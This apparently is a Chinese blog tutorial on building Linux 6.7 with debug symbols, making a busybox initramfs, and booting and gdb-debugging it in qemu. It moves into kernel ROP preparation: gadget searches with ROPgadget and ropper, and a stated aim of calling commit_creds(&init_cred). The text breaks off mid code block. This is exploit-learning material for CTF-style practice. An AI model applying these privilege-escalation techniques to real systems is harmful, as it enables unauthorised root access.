<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/src</span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.7.tar.gz</span><br><span class="line">tar -xzf linux-6.7.tar.gz</span><br><span class="line">cd linux-6.7</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>Kernel hakcing-&gt;</p>
<p>Compile-time checks and compiler options-&gt;</p>
<p>Debug information-&gt;Rely on the toolchain's implicit default DWARF
version</p>
<p>或者矮人4或者矮人5格式的调试信息都可以,只要是带着调试信息就可</p>
<p>配置完成之后</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>
<p>等待编译链接完成之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
<h3 id="生成文件">生成文件</h3>
<p>内核的编译链接有三个阶段</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240222203727335.png"
alt="image-20240222203727335" />
<figcaption aria-hidden="true">image-20240222203727335</figcaption>
</figure>
<h4 id="vmlinux">vmlinux</h4>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name vmlinux</span><br><span class="line">./arch/x86/boot/compressed/vmlinux</span><br><span class="line">./vmlinux</span><br><span class="line">./tools/perf/util/bpf_skel/vmlinux  //这实际是vmlinux.h头文件</span><br></pre></td></tr></table></figure>
<p>根目录下面这个带有调试符号的linux
elf,不可以作为引导内核,是第一次编译链接的产物<br /></p>
<p>linux/arch/x86/boot/compressed/vmlinux这个是和piggy等又链接过的,并且经过了压缩</p>
<h4 id="bzimage">bzImage</h4>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name bzImage</span><br><span class="line">./arch/x86/boot/bzImage</span><br><span class="line">./arch/x86_64/boot/bzImage</span><br></pre></td></tr></table></figure>
<p>真的bzImage只有一个,只不过x86_64下面这个,是x86这个的链接</p>
<p>linux/arch/x86/boot/bzImage这个是最终产物,可以引导</p>
<h4 id="vmlinuz">vmlinuz</h4>
<p>内核编译链接完毕后,在项目根目录make
install,会在/boot/下面生成vmlinuz-<版本号></p>
<p>这个vmlinuz-<版本号>实际上就是bzImage</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/boot# ll /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 14:44 /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">root@Destroyer:/boot# ll vmlinuz*</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 20:42 vmlinuz-6.7.0</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 21 20:00 vmlinuz-6.7.0.old</span><br></pre></td></tr></table></figure>
<h3 id="qemu虚拟机">qemu虚拟机</h3>
<p>qemu的作用类似于vmware,但是可以更自由地配置,调试其上运行的内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/qemu/qemu.git</span><br><span class="line">cd qemu</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>之后就可以在任意目录使用qemu工具了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball# qemu-</span><br><span class="line">qemu-edid                      qemu-system-i386w.exe          qemu-system-riscv32w.exe</span><br><span class="line">qemu-edid.exe                  qemu-system-loongarch64.exe    qemu-system-riscv64.exe</span><br><span class="line">qemu-ga                        qemu-system-loongarch64w.exe   qemu-system-riscv64w.exe</span><br><span class="line">qemu-ga.exe                    qemu-system-m68k.exe           qemu-system-rx.exe</span><br><span class="line">qemu-img                       qemu-system-m68kw.exe          qemu-system-rxw.exe</span><br><span class="line">qemu-img.exe                   qemu-system-microblaze.exe     qemu-system-s390x.exe</span><br><span class="line">qemu-io                        qemu-system-microblazeel.exe   qemu-system-s390xw.exe</span><br><span class="line">qemu-io.exe                    qemu-system-microblazeelw.exe  qemu-system-sh4.exe</span><br><span class="line">qemu-nbd                       qemu-system-microblazew.exe    qemu-system-sh4eb.exe</span><br><span class="line">qemu-nbd.exe                   qemu-system-mips.exe           qemu-system-sh4ebw.exe</span><br><span class="line">qemu-pr-helper                 qemu-system-mips64.exe         qemu-system-sh4w.exe</span><br><span class="line">qemu-storage-daemon            qemu-system-mips64el.exe       qemu-system-sparc.exe</span><br><span class="line">qemu-storage-daemon.exe        qemu-system-mips64elw.exe      qemu-system-sparc64.exe</span><br><span class="line">qemu-system-aarch64.exe        qemu-system-mips64w.exe        qemu-system-sparc64w.exe</span><br><span class="line">qemu-system-aarch64w.exe       qemu-system-mipsel.exe         qemu-system-sparcw.exe</span><br><span class="line">qemu-system-alpha.exe          qemu-system-mipselw.exe        qemu-system-tricore.exe</span><br><span class="line">qemu-system-alphaw.exe         qemu-system-mipsw.exe          qemu-system-tricorew.exe</span><br><span class="line">qemu-system-arm.exe            qemu-system-nios2.exe          qemu-system-x86_64</span><br><span class="line">qemu-system-armw.exe           qemu-system-nios2w.exe         qemu-system-x86_64.exe</span><br><span class="line">qemu-system-avr.exe            qemu-system-or1k.exe           qemu-system-x86_64w.exe</span><br><span class="line">qemu-system-avrw.exe           qemu-system-or1kw.exe          qemu-system-xtensa.exe</span><br><span class="line">qemu-system-cris.exe           qemu-system-ppc.exe            qemu-system-xtensaeb.exe</span><br><span class="line">qemu-system-crisw.exe          qemu-system-ppc64.exe          qemu-system-xtensaebw.exe</span><br><span class="line">qemu-system-hppa.exe           qemu-system-ppc64w.exe         qemu-system-xtensaw.exe</span><br><span class="line">qemu-system-hppaw.exe          qemu-system-ppcw.exe           qemu-uninstall.exe</span><br><span class="line">qemu-system-i386.exe           qemu-system-riscv32.exe</span><br></pre></td></tr></table></figure>
<p>这里带有system字样的是为了适应不同的架构</p>
<p>有<code>qemu-system-x86_64</code>就够了</p>
<p>qemu-img是创建虚拟磁盘使用的</p>
<p>如下是用qemu启动一个虚拟机的命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s \</span><br></pre></td></tr></table></figure>
<p>其中</p>
<p>-m是虚拟机运行内存</p>
<p>-kernel指定内核镜像文件在本机中的地址</p>
<p><strong>-initrd指定内存文件系统,现在可以理解为磁盘</strong></p>
<p>-append是启动参数</p>
<p>-smp指定多核多线程</p>
<p>-cpu指定虚拟CPU的类型</p>
<p>-s启动调试监听,允许gdb随时远程附加调试</p>
<p>那么什么是"内存文件系统"</p>
<h3 id="内存文件系统">内存文件系统</h3>
<p>之前有一次安装kali虚拟机时,第一次开机没有进入到桌面,而是一个(initramfs)的shell</p>
<p>意思是,操作系统内核已经起来了,但是没有挂载根文件系统rootfs</p>
<p>那么什么是内存文件系统,什么是根文件系统呢</p>
<p>首先要明确,内核离了硬盘也是能活着的,可以用其他文件系统比如网络或者内存文件系统</p>
<p>内存文件系统是内核启动过程中使用的临时文件系统,内存文件系统(initrd或者initramfs)也是一个完整的linux目录树,并且在/bin下面有一套精简的命令工具集,比如busybox.在sbin下也有相关工具比如insmod,通常也是链接到/bin/busybox</p>
<p>这些工具在启动过程中可以供内核调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox<span class="number">-1.36</span><span class="number">.1</span>/_install<span class="meta"># tree -L 1</span></span><br><span class="line">.</span><br><span class="line">├── bin			<span class="comment">//用户工具</span></span><br><span class="line">├── dev</span><br><span class="line">├── etc</span><br><span class="line">├── init		<span class="comment">//开机自动执行的任务脚本</span></span><br><span class="line">├── ktest.ko	</span><br><span class="line">├── linuxrc -&gt; bin/busybox</span><br><span class="line">├── proc</span><br><span class="line">├── sbin		<span class="comment">//超级管理员工具</span></span><br><span class="line">├── sys</span><br><span class="line">└── usr</span><br></pre></td></tr></table></figure>
<p>内存文件系统也存放在磁盘上,通常在/boot/initrd.img</p>
<p>实际上就是上述目录树打包后的归档文件</p>
<p>这就意味着,kernel开始启动之前,内存文件系统已经被解包并且搬到内存里去了</p>
<p>这就意味着,得有一个东西,它知道磁盘上的文件系统格式比如ext4,并且能正确访问到/boot/initrd.img,并且能解包.</p>
<p>这个东西就是grub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动过程:mbr-&gt;grub-&gt;kernel</span><br></pre></td></tr></table></figure>
<p>内核使用临时文件系统起来之后,临时文件系统的init脚本会规定此阶段内核应该干什么,挂载硬盘就是这时候发生的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox-1.36.1/_install# <span class="built_in">cat</span> init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /ktest.ko</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>这里面使用的命令比如insmod就是临时文件系统提供的</p>
<p>如果后续要挂载磁盘首先需要让内核知道磁盘上的文件系统格式,比如ext2</p>
<p>也就是说insmod ext2之后,内核才能识别并访问ext2格式化的磁盘.</p>
<p>即时磁盘上的文件系统中有ext2模块,有insmod命令,但是此时还没有挂载,没法使用</p>
<p>因此只能是临时文件系统提供这个功能</p>
<p>也就是说,内存文件系统为内核提供了一套必要的访问磁盘的工具</p>
<p>至于为什么叫做"内存文件系统",因为整个initrd.img文件很小,会被全部加载进入内存,因此访问速度很快</p>
<h4 id="制作linux临时文件系统">制作linux临时文件系统</h4>
<p>可以直接使用busybox</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/add358/busybox.git</span><br><span class="line">cd busybox</span><br></pre></td></tr></table></figure>
<p>然后make menuconfig,</p>
<p>Settings-&gt;Build Options-&gt;Build static binary(no shared
libs)选上</p>
<p>这一步的目的是将busybox静态链接,可以脱离glibc环境运行,因为内存文件系统很小,不需要glibc</p>
<p>Applets-&gt;Linux System Utilities-&gt;Support mounting NFS file
systems on Linux &lt; 2.6.23 (NEW)不选</p>
<p>这一步的目的是设置不挂载网络文件系统,为了精简大小</p>
<p>Applets-&gt;Networking Utilities-&gt;inetd不选</p>
<p>这一步的目的是不使用网络,为了精简大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>make install之后会在当前目录下生成一个<code>_install</code>目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">ls</span></span><br><span class="line">bin  linuxrc  sbin  usr</span><br></pre></td></tr></table></figure>
<p>也就是说,busybox提供了bin,sbin,usr三个目录的功能</p>
<p>usr下面的bin和sbin实际上是_install目录下两个同名目录的链接</p>
<p>然后bin,sbin里面的工具,也全是到bin/busybox的链接</p>
<p>也就是说,生成了一个busybox可执行程序,创建了一大堆链接</p>
<p>至于sys,dev等目录他不管,我们借助这个半成品加上这几个目录就可以构造一个临时文件系统了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
<p>然后在当前目录下创建init脚本,规定内核启动时要干啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>改一下文件权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>
<p>之后在_install目录打包整个临时文件系统</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install<span class="meta"># find . | cpio -o --format=newc &gt; ../rootfs.img</span></span><br><span class="line"><span class="number">5949</span> blocks</span><br></pre></td></tr></table></figure>
<p>这会在上级目录生成一个rootfs.img归档文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">cd</span> ..</span><br><span class="line">root@Destroyer:/home/dustball/busybox# file rootfs.img</span><br><span class="line">rootfs.img: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>
<p>这个文件就可以作为临时文件系统了</p>
<h3 id="启动内核">启动内核</h3>
<p>把可以引导的内核镜像bzImage也搬到rootfs.img所在的目录来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox# cp /usr/src/linux-6.7/arch/x86/boot/bzImage .</span><br></pre></td></tr></table></figure>
<p>之后可以用qemu启动内核了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 </span><br></pre></td></tr></table></figure>
<p>如果没起来,报告找不到/dev/tty,可能是init脚本没有给执行权限</p>
<p>-m指定使用内存大小</p>
<p>-kernel指定内核镜像文件</p>
<p>-initrd指定临时文件系统文件</p>
<p>-append指定启动参数,</p>
<blockquote>
<p>root=/dev/ram,根文件系统也使用临时文件系统 rw可读写</p>
<p>console=ttyS0,指定串口终端0,改成tty0或者ttyS1都看不到输出,还不清楚原因</p>
<p>oops=panic panic1 指定发生oops异常时,应该触发内核崩溃</p>
<p>nokaslr,方便调试关闭内核地址随机化</p>
</blockquote>
<h4 id="内存文件系统编译进内核">内存文件系统编译进内核</h4>
<p>之前的内核是一个裸核,内存文件系统是单独制作然后用qemu启动的</p>
<p>可以直接编译进内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/OnlyLove_/article/details/124565282</span><br></pre></td></tr></table></figure>
<p>坏处是如果想要修改文件系统,需要重新编译内核</p>
<h3 id="调试内核">调试内核</h3>
<p>启动内核时加上调试选项-s,这样就会在127.0.0.1:1234上开启监听端口</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
<p>然后启动,再开一个终端,用gdb就可以远程调试了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
<h4 id="添加调试信息">添加调试信息</h4>
<p>用于引导的bzImage已经去掉了调试信息,如果直接用gdb给start_kernel这种函数下断点,找不到符号</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">No symbol table is loaded.  Use the <span class="string">&quot;file&quot;</span> <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
<p>vmlinux中保留有调试信息(编译时保留了调试信息比如dwarf5),将其作为调试符号来源</p>
<p>首先需要知道将vmlinux添加到哪里,也就是内核在内存中的地址</p>
<p>在gdb上c一下让调试内核能够自由执行,然后在被调试的内核上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc # cat /proc/iomem | grep &quot;Kernel code&quot;</span><br><span class="line">  01000000-01ffffff : Kernel code</span><br></pre></td></tr></table></figure>
<p>也就是内核基地址在0x01000000</p>
<p>在gdb上添加调试符号(ctrl+C中断内核)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./vmlinux <span class="number">0x01000000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;./vmlinux&quot;</span> at</span><br><span class="line">        .text_addr = <span class="number">0x01000000</span></span><br><span class="line">Reading symbols from ./vmlinux...done.</span><br></pre></td></tr></table></figure>
<p>之后就可以在内核函数上下断点了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x1e457e0</span>: start_kernel. (<span class="number">2</span> locations)</span><br></pre></td></tr></table></figure>
<p>也可以源码调试内核了</p>
<h4 id="添加内核模块调试信息">添加内核模块调试信息</h4>
<p>类似的方法,需要知道的是内核模块在内存中的地址,作为调试符号输入的ko模块文件需要保留调试符号</p>
<p>至于如何保留内核模块的调试符号,需要加入gcc的编译选项-g,<code>CFLAGS_MODULE=-g</code></p>
<p>Makefile这样写</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# <span class="built_in">cat</span> Makefile</span><br><span class="line">obj-m += ktest.o</span><br><span class="line"></span><br><span class="line">KDIR = /usr/src/linux-6.7</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">        $(MAKE) -C $(KDIR) M=$(PWD) modules CFLAGS_MODULE=-g</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>
<p>新编译好的内核模块,注意放到<code>_install</code>下面之后重新cpio打包</p>
<p>给内核模块添加调试符号,首先需要知道该模块被加载到内存的地址</p>
<p>在gdb上c一下让内核继续</p>
<p>然后在被调试的内核上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc <span class="meta"># cat /proc/modules</span></span><br><span class="line">ktest <span class="number">12288</span> <span class="number">0</span> - Live <span class="number">0xffffffffc0000000</span> (O)</span><br></pre></td></tr></table></figure>
<p>也就是说内核模块ktest在0xffffffffc0000000</p>
<p>下面从gdb上为其加载符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./ktest.ko 0xffffffffc0000000</span><br><span class="line">add symbol table from file &quot;./ktest.ko&quot; at</span><br><span class="line">        .text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from ./ktest.ko...done.</span><br></pre></td></tr></table></figure>
<p>之后就可以下断点,源码调试了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b ko_test_init</span><br><span class="line">Breakpoint 2 at 0xffffffffc0000000: file /home/dustball/kd/ktest.c, line 7.</span><br></pre></td></tr></table></figure>
<h2 id="内核数据结构">内核数据结构</h2>
<h2 id="内核rop">内核ROP</h2>
<h3 id="工具">工具</h3>
<p>用户态ROP利用gadget构造<code>system("/bin/sh")</code></p>
<p>内核ROP利用gadget构造<code>commit_creds(&amp;init_cred)</code></p>
<h4 id="ropgadget">ROPgadget</h4>
<p>用户态pwn题常用ROPgadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/pwn2security/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0x00000000000010d5</span> : jmp rsp</span><br><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /usr/src/linux<span class="number">-6.7</span>/vmlinux --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0xffffffff81220783</span> : jmp rsp</span><br></pre></td></tr></table></figure>
<p>但是从内核vmlinux中找gadget比较慢</p>
<h4 id="ropper">ropper</h4>
<p>类似于ROPgadget,但是听说速度快点,没有验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ropper -f /usr/src/linux-6.7/vmlinux --search <span class="string">&quot;jmp rsp&quot;</span></span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 88%</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: jmp rsp</span><br><span class="line">[INFO] File: /usr/src/linux-6.7/vmlinux</span><br><span class="line">0xffffffff81220783: jmp rsp;</span><br></pre></td></tr></table></figure>
<p>ropper的semantic功能,可以进行简单的静态语义分析,找到令rax=0这种gadget</p>
<h4 id="extract-vmlinux">extract-vmlinux</h4>
<p><a
target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">linux/scripts/extract-vmlinux
at master · torvalds/linux · GitHub</a></p>
<p>bzImage是一个经过压缩的内核,如果想要寻找gadget,必须使用一个未被压缩的elf文件,也就是vmlinux</p>
<p>如果题目给出了一个bzImage,可以用extract-vmlinux提取vmlinux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<h3 id="cred结构">cred结构</h3>
<p>cred结构体管理进程权限,用户id等信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 